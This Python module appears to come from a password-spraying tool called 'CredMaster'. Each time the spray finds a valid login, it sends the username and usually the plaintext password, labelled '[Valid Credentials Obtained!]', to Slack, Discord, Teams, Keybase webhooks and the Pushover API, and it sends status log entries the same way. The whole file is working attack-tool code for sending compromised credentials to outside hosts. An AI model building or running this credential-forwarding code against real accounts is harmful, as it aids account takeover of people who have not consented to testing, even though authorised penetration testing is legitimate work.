import requests, json
from datetime import datetime
from discordwebhook import Discord

def notify_success(username, password, notify_obj):

    slack_webhook = notify_obj['slack_webhook']
    discord_webhook = notify_obj['discord_webhook']
    teams_webhook = notify_obj['teams_webhook']
    pushover_token = notify_obj['pushover_token']
    pushover_user = notify_obj['pushover_user']
    keybase_webhook = notify_obj['keybase_webhook']
    operator = notify_obj['operator_id']
    exclude_password = notify_obj['exclude_password']

    if slack_webhook is not None:
        slack_notify(username, password, operator, exclude_password, slack_webhook)

    if pushover_token is not None and pushover_user is not None:
        pushover_notify(username, password, operator, exclude_password, pushover_token, pushover_user)

    if discord_webhook is not None:
        discord_notify(username, password, operator, exclude_password, discord_webhook)

    if teams_webhook is not None:
        teams_notify(username, password, operator, exclude_password, teams_webhook)

    if keybase_webhook is not None:
        keybase_notify(username, password, operator, exclude_password, keybase_webhook)


def notify_update(message, notify_obj):

    slack_webhook = notify_obj['slack_webhook']
    discord_webhook = notify_obj['discord_webhook']
    teams_webhook = notify_obj['teams_webhook']
    pushover_token = notify_obj['pushover_token']
    pushover_user = notify_obj['pushover_user']
    keybase_webhook = notify_obj['keybase_webhook']
    operator = notify_obj['operator_id']

    if slack_webhook is not None:
        slack_update(message, operator, slack_webhook)

    if pushover_token is not None and pushover_user is not None:
        pushover_update(message, operator, pushover_token, pushover_user)

    if discord_webhook is not None:
        discord_update(message, operator, discord_webhook)

    if teams_webhook is not None:
        teams_update(message, operator, teams_webhook)

    if keybase_webhook is not None:
        keybase_update(message, operator, keybase_webhook)


# Function for posting username/password to keybase channel
def keybase_notify(username, password, operator, exclude_password, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    pwd_insert = f"Pass: {password}\n"
    if exclude_password:
        pwd_insert = ""

    text = "```[Valid Credentials Obtained!]\n" + \
            f"{op_insert}" + \
            f"User: {username}\n" + \
            f"{pwd_insert}" + \
            f"Date: {date}\n" + \
            f"Time: {time}```"

    message = {
        "msg" : text
    }

    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )
    if response.status_code == 200:
        print('Notification successfully sent to Keybase.')
    else:
        print('Notification attempt to Keybase failed.')
        print('Error:', response.text)


# Function for debug messages
def keybase_update(message, operator, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    text = "```[Log Entry]\n" + \
            f"{op_insert}" + \
            f"{message}\n" + \
            f"Date: {date}\n" + \
            f"Time: {time}```"

    message = {
        "msg" : text
    }
    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )
    if response.status_code == 200:
        print('Notification successfully sent to Keybase.')
    else:
        print('Notification attempt to Keybase failed.')
        print('Error:', response.text)


# Function for posting username/password to slack channel
def slack_notify(username, password, operator, exclude_password, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    pwd_insert = f"Pass: {password}\n"
    if exclude_password:
        pwd_insert = ""

    text = "```[Valid Credentials Obtained!]\n" + \
            f"{op_insert}" + \
            f"User: {username}\n" + \
            f"{pwd_insert}" + \
            f"Date: {date}\n" + \
            f"Time: {time}```"

    message = {
        "text" : text
    }

    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )
    if response.status_code == 200:
        print('Notification successfully sent to Slack.')
    else:
        print('Notification attempt to Slack failed.')
        print('Error:', response.text)


# Function for debug messages
def slack_update(message, operator, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    text = "```[Log Entry]\n" + \
            f"{op_insert}" + \
            f"{message}\n" + \
            f"Date: {date}\n" + \
            f"Time: {time}```"

    message = {
        "text" : text
    }
    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )
    if response.status_code == 200:
        print('Notification successfully sent to Slack.')
    else:
        print('Notification attempt to Slack failed.')
        print('Error:', response.text)


# Function for posting username/password to Discord
def discord_notify(username, password, operator, exclude_password, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    pwd_insert = f"Pass: {password}\n"
    if exclude_password:
        pwd_insert = ""

    text = ("```[Valid Credentials Obtained!]\n"
            f"{op_insert}"
            f"User: {username}\n"
            f"{pwd_insert}"
            f"Date: {date}\n"
            f"Time: {time}```")

    discord = Discord(url=webhook)
    discord.post(content=text)


# Discord notify message
def discord_update(message, operator, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    text = ("```[Log Entry]\n"
            f"{op_insert}"
            f"{message}\n"
            f"Date: {date}\n"
            f"Time: {time}```")

    discord = Discord(url=webhook)
    discord.post(content=text)


# Teams notify function
def teams_notify(username, password, operator, exclude_password, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    pwd_insert = f"Pass: {password}\n"
    if exclude_password:
        pwd_insert = ""

    content = "[Valid Credentials Obtained!]\n" + \
        f"{op_insert}" + \
        f"User: {username}\n" + \
        f"{pwd_insert}" + \
        f"Date: {date}\n" + \
        f"Time: {time}"

    response = requests.post(
        url=webhook,
        headers={"Content-Type": "application/json"},
        json={
            "summary": "[Valid Credentials Obtained!]",
            "sections": [{
                "activityTitle": "CredMaster Bot",
                "activitySubtitle": f"{content}"
            }],
        },
    )
    if response.status_code == 200:
        print('Notification successfully sent to Teams.')
    else:
        print('Notification attempt to Teams failed.')
        print('Error:', response.text)


# Teams message notify function
def teams_update(message, operator, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    content = "[Log Entry]\n" + \
        f"{op_insert}" + \
        f"Message: {message}\n" + \
        f"Date: {date}\n" + \
        f"Time: {time}"

    response = requests.post(
        url=webhook,
        headers={"Content-Type": "application/json"},
        json={
            "summary": "[Log Entry!]",
            "sections": [{
                "activityTitle": "CredMaster Bot",
                "activitySubtitle": f"{content}"
            }],
        },
    )
    if response.status_code == 200:
        print('Notification successfully sent to Teams.')
    else:
        print('Notification attempt to Teams failed.')
        print('Error:', response.text)


# Pushover notify of valid creds
def pushover_notify(username, password, operator, exclude_password, token, user):

    headers = {'Content-Type' : 'application/x-www-form-urlencoded'}

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    pwd_insert = f"Pass: {password}\n"
    if exclude_password:
        pwd_insert = ""

    text = f"{op_insert}" + \
            f"User: {username}\n" + \
            f"{pwd_insert}" + \
            f"Date: {date}\n" + \
            f"Time: {time}"

    data = {
        'token' : token,
        'user' : user,
        'title' : '[PassSpray: Valid Credentials Obtained!]',
        'priority' : '1',
        'message' : text
    }

    r = requests.post('https://api.pushover.net/1/messages', headers=headers, data=data)
    if r.status_code == 200:
        print('[+] ')


# Pushover generic update messages
def pushover_update(message, operator, token, user):

    headers = {'Content-Type' : 'application/x-www-form-urlencoded'}

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    text = f"{op_insert}" + \
            f"{message}\n" + \
            f"Date: {date}\n" + \
            f"Time: {time}"

    data = {
        'token' : token,
        'user' : user,
        'title' : '[PassSpray: Log]',
        'priority' : '1',
        'message' : text
    }

    response = requests.post(
        'https://api.pushover.net/1/messages',
        headers=headers,
        data=data
    )
    if response.status_code == 200:
        print('Notification successfully sent to Pushover.')
    else:
        print('Notification attempt to Pushover failed.')
        print('Error:', response.text)
